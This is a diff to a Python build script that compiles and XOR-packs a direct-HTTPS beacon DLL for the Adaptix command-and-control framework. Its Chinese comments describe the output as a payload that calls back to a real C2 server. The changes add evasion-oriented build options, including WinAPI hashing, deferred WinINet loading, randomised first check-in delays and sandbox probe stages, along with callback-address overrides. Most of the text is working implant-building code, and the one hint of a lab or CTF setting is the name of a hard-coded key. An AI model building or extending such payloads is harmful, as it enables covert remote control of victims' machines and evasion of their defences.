@@ -19,11 +19,18 @@ import time
 import urllib.request
 from pathlib import Path
 
-ROOT = Path(os.environ.get("ROOT", Path(__file__).resolve().parents[2]))
+DEFAULT_ROOT = Path(__file__).resolve().parents[2]
+ROOT = Path(os.environ.get("ROOT", str(DEFAULT_ROOT)))
 LAB = ROOT / "research/memory-loader-lab"
-AGENT_SRC = ROOT / "AdaptixServer/extenders/direct_https_agent/src_beacon"
-AGENT_CONFIG = ROOT / "AdaptixServer/extenders/direct_https_agent/config.yaml"
-DEFAULT_KEY = os.environ.get("PROFILE_ONLY_KEY", "CHANGE_ME_MEMORY_LOADER_KEY")
+AGENT_SRC = Path(os.environ.get(
+    "DIRECT_HTTPS_AGENT_SRC",
+    str(ROOT / "AdaptixServer/extenders/direct_https_agent/src_beacon"),
+))
+AGENT_CONFIG = Path(os.environ.get(
+    "DIRECT_HTTPS_AGENT_CONFIG",
+    str(ROOT / "AdaptixServer/extenders/direct_https_agent/config.yaml"),
+))
+DEFAULT_KEY = "ctf-memory-loader-key-20260624"
 
 
 def sha256_file(path: Path) -> str:
@@ -83,16 +90,16 @@ class Api:
         self.token = obj["access_token"]
 
 
-def read_agent_watermark() -> str:
+def read_agent_watermark(agent_config: Path = AGENT_CONFIG) -> str:
     """读取 direct_https_agent/config.yaml 里的 agent_watermark。
 
     agent_watermark 会被打进 profile，用于让 teamserver 判断回连的 agent 类型。
     如果 DLL payload 里的 watermark 和服务端配置不一致，agent 可能无法正常登记。
     """
-    text = AGENT_CONFIG.read_text(encoding="utf-8", errors="ignore")
+    text = agent_config.read_text(encoding="utf-8", errors="ignore")
     m = re.search(r"agent_watermark:\s*\"?([0-9a-fA-F]+)\"?", text)
     if not m:
-        raise RuntimeError(f"cannot find agent_watermark in {AGENT_CONFIG}")
+        raise RuntimeError(f"cannot find agent_watermark in {agent_config}")
     return m.group(1)
 
 
@@ -171,7 +178,7 @@ def split_host_port(item: str):
     return host, int(port)
 
 
-def build_profile(listener_row, sleep_value: str, jitter: int, rotation_mode: str, proxy):
+def build_profile(listener_row, sleep_value: str, jitter: int, rotation_mode: str, proxy, agent_config: Path = AGENT_CONFIG):
     """把 Adaptix listener 配置转换成 direct_https DLL 内置 PROFILE。
 
     这一步是“生成能真实回连 C2 的 DLL payload”的核心：
@@ -185,7 +192,7 @@ def build_profile(listener_row, sleep_value: str, jitter: int, rotation_mode: st
     HTTP profile，最终表现为没有 callback。
     """
     listener = json.loads(listener_row["l_data"])
-    agent_watermark = int(read_agent_watermark(), 16)
+    agent_watermark = int(read_agent_watermark(agent_config), 16)
     listener_watermark = int(listener_row["l_watermark"], 16)
     sleep_seconds = parse_sleep_seconds(sleep_value)
     encrypt_key = bytes.fromhex(listener["encrypt_key"])
@@ -279,6 +286,10 @@ def main():
     """命令行入口：读取 listener -> 构建 DLL -> XOR pack -> 写 build-meta.json。"""
     ap = argparse.ArgumentParser()
     ap.add_argument("--listener", default="https_8443_1")
+    ap.add_argument("--callback-address", action="append", default=[],
+                    help="override listener callback_addresses; repeatable, format host:port")
+    ap.add_argument("--host-header", action="append", default=[],
+                    help="override listener host_header; repeatable")
     ap.add_argument("--sleep", default="4s")
     ap.add_argument("--jitter", type=int, default=0)
     ap.add_argument("--rotation-mode", default="sequential", choices=["sequential", "random"])
@@ -291,15 +302,48 @@ def main():
     ap.add_argument("--sandbox-probe-stage", type=int, default=-1)
     ap.add_argument("--memory-loader-diag", action="store_true",
                     help="compile direct_https DLL with MMPP_LOADER_LOG based AgentMain trace logging")
+    ap.add_argument("--fast-first-loops", type=int, default=0,
+                    help="skip normal sleep for the first N empty check-ins, with a 100ms diagnostic pacing delay")
+    ap.add_argument("--agent-src", default=str(AGENT_SRC),
+                    help="direct_https src_beacon directory; defaults to active source or DIRECT_HTTPS_AGENT_SRC")
+    ap.add_argument("--agent-config", default=str(AGENT_CONFIG),
+                    help="direct_https config.yaml used for agent_watermark; defaults to active config or DIRECT_HTTPS_AGENT_CONFIG")
+    ap.add_argument("--beat-dialect", type=int, choices=[0, 1, 2], default=None,
+                    help="optional heartbeat dialect: 0=legacy, 1=LPH4, 2=LPH5 process-only identity")
+    ap.add_argument("--api-hashing", action="store_true",
+                    help="resolve WinAPI and WinINet symbols through the existing module/export hash path")
+    ap.add_argument("--lazy-wininet-init", action="store_true",
+                    help="defer wininet.dll and WinINet API initialization until the first network operation")
+    ap.add_argument("--lite-connector", action="store_true",
+                    help="use the compact connector implementation for the heartbeat build")
+    ap.add_argument("--learning-minimal", action="store_true",
+                    help="build a check-in/hello-only learning profile and omit file/process command APIs")
+    ap.add_argument("--file-commands-only", action="store_true",
+                    help="keep hello and file CRUD commands while omitting process and transfer tasks")
+    ap.add_argument("--heartbeat-only", action="store_true",
+                    help="build a WPP-compatible heartbeat-only profile without command parsing or task modules")
+    ap.add_argument("--hello-only", action="store_true",
+                    help="build a WPP-compatible profile that accepts only native LPT4 hello tasks")
+    ap.add_argument("--initial-checkin-range-ms", nargs=2, type=int, metavar=("MIN", "MAX"),
+                    help="delay the first check-in by a random inclusive MIN..MAX millisecond range")
     ns = ap.parse_args()
+
+    if ns.heartbeat_only and ns.hello_only:
+        raise SystemExit("--heartbeat-only and --hello-only are mutually exclusive")
 
     load_env(Path(ns.env_file))
     password = os.environ.get("ADAPTIX_PASSWORD", "")
     if not password:
-        raise SystemExit(f"ADAPTIX_PASSWORD missing; set env or create {ROOT / ".adaptix_api.env"}")
+        raise SystemExit("ADAPTIX_PASSWORD missing; set it in the environment or in ROOT/.adaptix_api.env")
 
     out_dir = Path(ns.out_dir)
     obj = out_dir / "objects"
+    agent_src = Path(ns.agent_src)
+    agent_config = Path(ns.agent_config)
+    if not (agent_src / "Makefile").exists():
+        raise SystemExit(f"agent src Makefile not found: {agent_src}")
+    if not agent_config.exists():
+        raise SystemExit(f"agent config not found: {agent_config}")
     out_dir.mkdir(parents=True, exist_ok=True)
     obj.mkdir(parents=True, exist_ok=True)
 
@@ -309,6 +353,14 @@ def main():
     row = next((x for x in listeners if x.get("l_name") == ns.listener), None)
     if not row:
         raise SystemExit(f"listener not found: {ns.listener}; available={[x.get('l_name') for x in listeners]}")
+    if ns.callback_address or ns.host_header:
+        row = dict(row)
+        listener_data = json.loads(row["l_data"])
+        if ns.callback_address:
+            listener_data["callback_addresses"] = ns.callback_address
+        if ns.host_header:
+            listener_data["host_header"] = ns.host_header
+        row["l_data"] = json.dumps(listener_data)
 
     profile, profile_meta = build_profile(row, ns.sleep, ns.jitter, ns.rotation_mode, {
         "use_proxy": False,
@@ -317,7 +369,7 @@ def main():
         "proxy_port": 3128,
         "proxy_username": "",
         "proxy_password": "",
-    })
+    }, agent_config)
     profile_literal = "".join(f"\\x{b:02x}" for b in profile)
     (out_dir / "profile.bin").write_bytes(profile)
 
@@ -327,28 +379,42 @@ def main():
     # removed the object directory, which left the later DLL link step without
     # Agent/Commander/ApiLoader objects.  Splitting the phases and forcing x64
     # makes the profile DLL generator deterministic.
+    # heartbeat-only is intentionally stricter than learning-minimal: it keeps
+    # the WPP loader, profile parsing and C2 heartbeat, but removes the command
+    # dispatcher and task modules from the linked DLL.
+    minimal_build = ns.learning_minimal or ns.file_commands_only or ns.heartbeat_only or ns.hello_only
     make_vars = [
         f"HTTP_DIST_DIR={obj}",
         f"DIRECT_HTTPS_PROBE_STAGE={ns.probe_stage}",
         "DIRECT_HTTPS_LAZY_HTTP_SEND=1",
+        f"DIRECT_HTTPS_LAZY_WININET_INIT={1 if ns.lazy_wininet_init else 0}",
+        f"DIRECT_HTTPS_LITE_CONNECTOR={1 if ns.lite_connector else 0}",
         "DIRECT_HTTPS_WININET_INIT_ORDER=0",
         f"DIRECT_HTTPS_SANDBOX_PROBE_STAGE={ns.sandbox_probe_stage}",
         "DIRECT_HTTPS_DELAY_BEFORE_SEND_MS=0",
         "DIRECT_HTTPS_REQUIRE_TRIGGER_FILE=0",
         "DIRECT_HTTPS_EXIT_BEFORE_SEND=0",
         "DIRECT_HTTPS_CAPTURE_PORT_8001=0",
+        f"DIRECT_HTTPS_NO_API_HASHING={0 if ns.api_hashing else 1}",
         f"DIRECT_HTTPS_MEMORY_LOADER_DIAG={1 if ns.memory_loader_diag else 0}",
-        # The memory-loader restore-feature build must initialize the full
-        # command/file/process API surface.  Earlier check-in-only variants set
-        # these macros to 1 and could still callback/hello, but cmd/file
-        # handlers later crashed because CreateProcessA/CreatePipe/file APIs
-        # were intentionally skipped.
-        "DIRECT_HTTPS_CHECKIN_ONLY=0",
-        "DIRECT_HTTPS_MINIMAL_IDENTITY=0",
-        "DIRECT_HTTPS_SKIP_UNUSED_API_INIT=0",
+        f"DIRECT_HTTPS_FAST_FIRST_LOOPS={max(0, ns.fast_first_loops)}",
+        # Full builds keep the existing command/file/process surface.  The
+        # learning and hello profiles only keep check-in/link-test paths;
+        # file_commands_only additionally retains the file CRUD handlers.
+        f"DIRECT_HTTPS_CHECKIN_ONLY={1 if minimal_build else 0}",
+        f"DIRECT_HTTPS_MINIMAL_IDENTITY={1 if minimal_build else 0}",
+        f"DIRECT_HTTPS_SKIP_UNUSED_API_INIT={1 if minimal_build else 0}",
+        f"DIRECT_HTTPS_LEARNING_MINIMAL={1 if minimal_build else 0}",
+        f"DIRECT_HTTPS_FILE_COMMANDS_ONLY={1 if ns.file_commands_only else 0}",
+        f"DIRECT_HTTPS_HEARTBEAT_ONLY={1 if ns.heartbeat_only else 0}",
+        f"DIRECT_HTTPS_HELLO_ONLY={1 if ns.hello_only else 0}",
+        f"DIRECT_HTTPS_INITIAL_CHECKIN_MIN_MS={ns.initial_checkin_range_ms[0] if ns.initial_checkin_range_ms else 0}",
+        f"DIRECT_HTTPS_INITIAL_CHECKIN_MAX_MS={ns.initial_checkin_range_ms[1] if ns.initial_checkin_range_ms else 0}",
     ]
-    run(["make", "-C", AGENT_SRC, *make_vars, "clean", "pre"])
-    run(["make", "-C", AGENT_SRC, *make_vars, "-B", "x64"])
+    if ns.beat_dialect is not None:
+        make_vars.append(f"DIRECT_HTTPS_BEAT_DIALECT={ns.beat_dialect}")
+    run(["make", "-C", agent_src, *make_vars, "clean", "pre"])
+    run(["make", "-C", agent_src, *make_vars, "-B", "x64"])
 
     cxx = os.environ.get("CXX", "x86_64-w64-mingw32-g++")
     run([
@@ -359,7 +425,7 @@ def main():
     ])
     run([
         cxx, "-c", LAB / "src/direct_https_dll_entry.cpp",
-        "-I", AGENT_SRC / "beacon",
+        "-I", agent_src / "beacon",
         "-fpermissive", "-w", "-masm=intel", "-fPIC", "-D", "BEACON_HTTP",
         "-o", obj / "direct_https_dll_entry.x64.o",
     ])
@@ -369,6 +435,14 @@ def main():
         "Crypt", "Downloader", "Encoders", "JobsController", "MainAgent", "MemorySaver", "Packer",
         "ProcLoader", "WaitMask", "crt", "std", "utils", "direct_https_dll_entry",
     ]
+    if ns.heartbeat_only:
+        object_names = [name for name in object_names if name not in {
+            "Commander", "Downloader", "JobsController", "MemorySaver",
+        }]
+    elif ns.hello_only or ns.learning_minimal or ns.file_commands_only:
+        object_names = [name for name in object_names if name not in {
+            "Downloader", "JobsController", "MemorySaver",
+        }]
     dll = out_dir / "direct_https_profile.x64.dll"
     bin_path = out_dir / "direct_https_profile.x64.bin"
     implib = out_dir / "libdirect_https_profile.a"
@@ -387,6 +461,19 @@ def main():
         "probe_stage": ns.probe_stage,
         "sandbox_probe_stage": ns.sandbox_probe_stage,
         "memory_loader_diag": bool(ns.memory_loader_diag),
+        "fast_first_loops": max(0, ns.fast_first_loops),
+        "agent_src": str(agent_src),
+        "agent_config": str(agent_config),
+        "beat_dialect": ns.beat_dialect,
+        "api_hashing": bool(ns.api_hashing),
+        "lazy_wininet_init": bool(ns.lazy_wininet_init),
+        "lite_connector": bool(ns.lite_connector),
+        "learning_minimal": bool(minimal_build),
+        "file_commands_only": bool(ns.file_commands_only),
+        "heartbeat_only": bool(ns.heartbeat_only),
+        "hello_only": bool(ns.hello_only),
+        "linked_modules": object_names,
+        "initial_checkin_range_ms": ns.initial_checkin_range_ms,
         "profile": profile_meta,
         "dll": {"path": str(dll), "sha256": sha256_file(dll), "size": dll.stat().st_size},
         "bin": {"path": str(bin_path), "sha256": sha256_file(bin_path), "size": bin_path.stat().st_size},
